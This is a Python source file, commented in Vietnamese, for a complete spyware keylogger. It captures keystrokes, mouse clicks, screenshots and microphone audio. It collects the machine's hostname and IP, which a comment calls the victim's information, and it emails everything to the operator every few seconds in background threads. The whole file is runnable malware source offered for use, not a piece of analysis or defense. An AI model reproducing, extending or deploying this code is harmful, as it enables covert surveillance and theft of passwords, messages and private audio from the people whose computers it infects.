import socket
import threading
import sys
import wave
import pyscreenshot
import yagmail

import pyaudio
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from email import encoders



EMAIL_ADDRESS = "mail"
EMAIL_PASSWORD = "pass"
SEND_REPORT_EVERY = 10 # Tự Động gửi sau mỗi  (giây)


class KeyLogger:

    def __init__(self, time_interval, email, password):
        hostname = socket.gethostname() # Thông tin Nạn Nhân
        ip = socket.gethostbyname(hostname)
        self.log = hostname + "\n" + ip  + "\n\n\n" 
        self.log += "KeyLogger Started..." + "\n\n"

        self.interval = time_interval
        self.email = email
        self.password = password

        print ("Started....")


    def appendlog(self, string):
        self.log = self.log + string

        
    def on_click(self, x, y, button, pressed):
        self.appendlog("\n" + str(button) + " " + str(x) + " " + str(y) )


    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                sys.exit() 
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)


    def send_mail(self , message , path):
        from_email = EMAIL_ADDRESS
        password = EMAIL_PASSWORD
        to_email = EMAIL_ADDRESS


        #Send
        if path == "":
            yag = yagmail.SMTP(from_email , password)
            yag.send(to = to_email , contents= str(message))
            print("Send Text Mail Successfully!")
        else:
            yag = yagmail.SMTP(from_email , password)
            yag.send(to = to_email , contents= str(message) , attachments=path)
            print("Send Multimedia Mail Successfully!")


    def report(self):
        if self.log !="":
            self.send_mail( message= "\n\n" + self.log , path="")
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def microphone(self):
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = SEND_REPORT_EVERY
        WAVE_OUTPUT_FILENAME = "voice.wav"

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        print("* recording")

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        print("* done recording")

        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        # self.send_mail(message="" , path="sound.wav")


    def screenshot(self):
        img = pyscreenshot.grab()
        img.save("Image.png")
        # self.send_mail(message="" , path="Image.png")
    

    def run(self):

        def task1():
            keyboard_listener = KeyboardListener(on_press=self.save_data)
            with keyboard_listener:
                self.report() 
                keyboard_listener.join()


        def task2():
            mouse_listener = MouseListener(on_click=self.on_click)
            with mouse_listener:
                mouse_listener.join()


        def task3():
            while True:
                self.screenshot()
                self.microphone()
                self.send_mail(message="" , path=["Image.png" , "voice.wav"])


        thread1 = threading.Thread(target=task1) # Xử lý đa luồng
        thread2 = threading.Thread(target=task2)
        thread3 = threading.Thread(target=task3) 

        
        thread1.start()        # Khởi động các luồng
        thread2.start()
        thread3.start()

       
        thread1.join()    # Đợi cho đến khi các luồng hoàn thành
        thread2.join()
        thread3.join()


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()